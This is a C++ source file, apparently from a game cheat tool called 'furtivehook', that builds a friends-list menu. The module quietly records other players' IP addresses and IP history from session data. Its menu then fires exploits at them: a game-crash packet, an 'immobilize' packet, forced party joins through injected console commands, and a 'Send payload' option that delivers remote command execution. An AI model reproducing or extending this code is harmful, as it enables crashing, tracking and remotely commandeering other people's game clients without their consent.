#include "dependencies/stdafx.hpp"
#include "friends.hpp"

namespace friends
{
	std::vector<friend_info> friends; 

	namespace
	{
		constexpr auto file_name{ "furtivehook\\friends.json" }; 
		
		json load_friends()
		{
			std::string data{};
			if (!utils::io::read_file(file_name, &data))
			{
				return {};
			}

			const auto result = json::parse(data);
			if (result.empty() || !result.is_object())
			{
				return {};
			}

			return result;
		}

		void update_ip_data()
		{
			for (size_t i = 0; i < 18; ++i)
			{
				const auto party = game::party_data();
				const auto users = party->session->dyn.users[i];
				const auto xuid = users.xuid;
				const auto netadr = users.addr;

				if (const auto f = friends::get(xuid))
				{
					if (netadr.type == game::NA_LOOPBACK || game::is_same_address(f->ip_data, netadr))
						continue;

					const auto netadr_ip_string = netadr.to_string(true);

					if (std::find(f->ip_aliases.begin(), f->ip_aliases.end(), f->ip_data) == f->ip_aliases.end())
					{
						f->ip_aliases.insert(f->ip_data);
					}

					f->ip_data = netadr_ip_string;

					friends::write();

					PRINT_LOG("Updated IP data of friend '%s' (%llu) to: %s", f->name.data(), f->id, netadr_ip_string.data());
				}
			}
		}
		
		void fetch_sessions(const friends::friend_info& f)
		{
			const auto netadr = game::net_string_to_adr(f.ip_data);

			if (!netadr.addr.inaddr)
			{
				return;
			}

			const auto data = session::build_hping(f.response);
			game::net::send_oob(netadr, data);
		}

		void update_online_status()
		{
			for (auto& f : friends)
			{
				if (f.is_online() && std::time(nullptr) - f.last_online > 15)
				{
					f.response = {};
					friends::write();

					PRINT_MESSAGE("Friends", "%s is offline.", f.name.data());
				}
				
				friends::fetch_sessions(f);
			}
		}

		void read()
		{
			friends.clear();

			const auto json = load_friends();
			for (const auto& data : json)
			{
				for (const auto& element : data)
				{
					auto& info = element.get<friend_info>();
					info.response = {};

					friends.emplace_back(std::move(info));
				}
			}
		}

		void remove(const std::uint64_t steam_id)
		{
			friends.erase(std::remove_if(friends.begin(), friends.end(), [&steam_id](const auto& f) { return f.id == steam_id; }));
			friends::write();
		}
	}
	
	friend_info* get(const uint64_t id)
	{
		const auto entry = std::find_if(friends.begin(), friends.end(), [id](const auto& f) { return f.id == id; });

		if (entry != friends.end())
		{
			return &*entry;
		}

		return nullptr;
	}

	friend_info* get_by_ip(const game::netadr_t& target)
	{
		const auto entry = std::find_if(friends.begin(), friends.end(), [=](const auto& f) { return game::is_same_address(f.ip_data, target); });

		if (entry != friends.end())
		{
			return &*entry;
		}

		return nullptr;
	}
	
	void write()
	{
		json result{};
		result["friends"] = friends;

		utils::io::write_file(file_name, result.dump());
	}

	void draw_friends_list(const float width, const float spacing)
	{
		if (ImGui::BeginTabItem("Friends"))
		{
			static ImGuiTextFilter filter;
			ImGui::TextUnformatted("Search friends");
			filter.Draw("##search_friend", "Name", width * 0.85f);

			ImGui::SameLine(0.0f, spacing);

			const auto popup = "Add friend##add_friend_popup"s;

			if (ImGui::Button("Add friend"))
			{
				ImGui::OpenPopup(popup.data());
			}

			if (ImGui::BeginPopupModal(popup.data(), nullptr, ImGuiWindowFlags_AlwaysAutoResize))
			{
				static auto name_input = ""s;
				static auto steam_id_input = ""s;

				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##name_input", "Name", &name_input);

				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##steam_id_input", "Steam ID", &steam_id_input);

				if (ImGui::MenuItem("Add friend", nullptr, nullptr, !name_input.empty() && !steam_id_input.empty()))
				{
					friends.emplace_back(friend_info{ utils::atoll(steam_id_input), name_input });
					friends::write();

					ImGui::CloseCurrentPopup();
				}

				if (ImGui::IsKeyPressedWithIndex(ImGuiKey_Escape))
				{
					ImGui::CloseCurrentPopup();
				}

				ImGui::EndPopup();
			}

			ImGui::Separator();

			ImGui::BeginColumns("Friends", 2, ImGuiColumnsFlags_NoResize);

			ImGui::TextUnformatted("Friend");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Online Status");
			ImGui::NextColumn();

			ImGui::Separator();

			std::vector<friend_info> sorted_friends{ friends };
			std::sort(sorted_friends.begin(), sorted_friends.end());

			for (auto& f : sorted_friends)
			{
				if (!filter.PassFilter(f.name))
					continue; 
				
				const auto response = f.response; 
				const auto netadr = response.netadr;
				const auto is_ready = f.is_online();
				const auto xuid = std::to_string(f.id);
				const auto label = f.name + "##friend" + xuid;

				ImGui::AlignTextToFramePadding();
				
				const auto selected = ImGui::Selectable(label);

				const auto popup = "friend_popup##" + xuid;

				if (selected)
					ImGui::OpenPopup(popup.data());

				if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
				{
					ImGui::MenuItem(f.name + "##friend_menu_item" + xuid, nullptr, false, false);

					if (ImGui::IsItemClicked())
					{
						ShellExecuteA(0, "open", ("https://steamcommunity.com/profiles/" + std::to_string(f.id)).data(), 0, 0, SW_SHOWNORMAL);
					}

					if (ImGui::IsItemHovered())
					{
						ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
					}
					
					if (ImGui::MenuItem("Remove"))
					{
						friends::remove(f.id);
					}

					if (ImGui::BeginMenu("Rename##" + xuid))
					{
						auto& name = friends::get(f.id)->name;

						if (ImGui::InputTextWithHint("##" + xuid, "Name", &name))
						{
							friends::write();
						}

						ImGui::EndMenu();
					}

					if (ImGui::BeginMenu("Nickname##" + xuid))
					{
						auto& nickname = friends::get(f.id)->nickname;

						if (ImGui::InputTextWithHint("##" + xuid, "Nickname", &nickname))
						{
							friends::write();
						}

						ImGui::EndMenu();
					}

					ImGui::Separator();

					if (ImGui::MenuItem(xuid))
					{
						ImGui::LogToClipboardUnformatted(xuid);
					}

					const auto ip_data_string = f.ip_data.empty() ? "Invalid IP Data" : f.ip_data;

					if (ImGui::MenuItem(ip_data_string, nullptr, nullptr, ip_data_string == f.ip_data))
					{
						ImGui::LogToClipboardUnformatted(ip_data_string);
					}

					if (ImGui::BeginMenu("IP aliases##" + xuid, !f.ip_aliases.empty()))
					{
						for (const auto& ip_alias : f.ip_aliases)
						{
							const auto label = ip_alias + "##" + xuid;

							if (ImGui::MenuItem(label))
							{
								ImGui::LogToClipboardUnformatted(ip_alias);
							}
						}

						ImGui::EndMenu();
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Tell to join our session", nullptr, nullptr, is_ready && !response.ingame))
					{
						exploit::send_rejoin_packet(netadr);
					}

					if (ImGui::MenuItem("Pull to party", nullptr, nullptr, is_ready))
					{
						exploit::join_party::send_payload(netadr, "cbuf", { "connect_lobby " + std::to_string(game::Steam_GetSteamLobbyID()) });
					}

					if (ImGui::MenuItem("Join session", nullptr, nullptr, is_ready))
					{
						game::join_lobby_ip(f.ip_data);
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Crash game", nullptr, nullptr, is_ready))
					{
						exploit::send_relay_crash(netadr);
					}

					if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, is_ready))
					{
						game::net::send_oob(netadr, "mstart");
					}

					if (ImGui::MenuItem("Immobilize", nullptr, nullptr, is_ready))
					{
						game::net::send_oob(netadr, "requeststats\n");
					}

					if (ImGui::BeginMenu("Send OOB##" + xuid, is_ready))
					{
						static auto oob_input = ""s;

						ImGui::InputTextWithHint("##" + xuid, "OOB", &oob_input);

						if (ImGui::MenuItem("Send OOB", nullptr, nullptr, !oob_input.empty()))
						{
							game::net::send_oob(netadr, oob_input);
						}

						ImGui::EndMenu();
					}

					if (ImGui::BeginMenu("Send payload##" + xuid, is_ready))
					{
						const auto rce_cmd = menu::get_rce_commands(width);

						if (ImGui::MenuItem("Execute"))
						{
							if (const auto args = utils::string::split(rce_cmd.first, ' '); !args.empty())
							{
								exploit::join_party::send_payload(netadr, rce_cmd.second, args);
							}
							else
							{
								exploit::join_party::send_payload(netadr, rce_cmd.second, {});
							}
						}

						ImGui::EndMenu();
					}

					ImGui::EndPopup();
				}

				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				const auto timestamp = f.last_online ? utils::string::data_time(f.last_online, false) : "Never";
				const auto online_status = is_ready ? "Online" : "Last seen: " + timestamp;
				ImGui::TextColored(is_ready ? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value, online_status.data());

				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}
			}

			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}
	
	void initialize()
	{
		scheduler::loop([]()
		{
			update_ip_data();
			update_online_status();
		}, scheduler::pipeline::main, 1s);

		try
		{
			friends::read();
			friends::write();
		}
		catch (const std::exception& ex)
		{
			PRINT_LOG("Could not read 'friends.json' (%s)", ex.what());
		}
	}
}
